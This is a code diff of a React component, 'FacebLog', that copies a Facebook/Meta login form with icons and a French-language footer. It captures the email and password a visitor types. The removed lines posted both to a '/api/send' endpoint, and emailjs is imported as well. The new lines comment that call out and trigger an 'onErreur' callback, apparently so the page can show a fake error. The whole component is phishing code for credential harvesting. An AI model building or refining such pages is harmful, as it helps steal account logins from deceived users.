@@ -2,19 +2,19 @@ import { useState } from "react";
 import emailjs from "@emailjs/browser";
 import { FaFacebook, FaMeta, FaEye, FaEyeSlash } from "react-icons/fa6";
 
-function FacebLog() {
+function FacebLog({ onErreur }) {
   const [showPassword, setShowPassword] = useState(false);
   const [password, setPassword] = useState("");
   const [email, setEmail] = useState("");
 
   const handleSubmit = async () => {
-    await fetch("/api/send", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, password }),
-    });
+    onErreur();
+    // await fetch("/api/send", {
+    //   method: "POST",
+    //   headers: { "Content-Type": "application/json" },
+    //   body: JSON.stringify({ email, password }),
+    // });
   };
-
   const footerLangs = [
     { label: "Français (France)", href: "#", active: true },
     { label: "Malagasy", href: "#" },
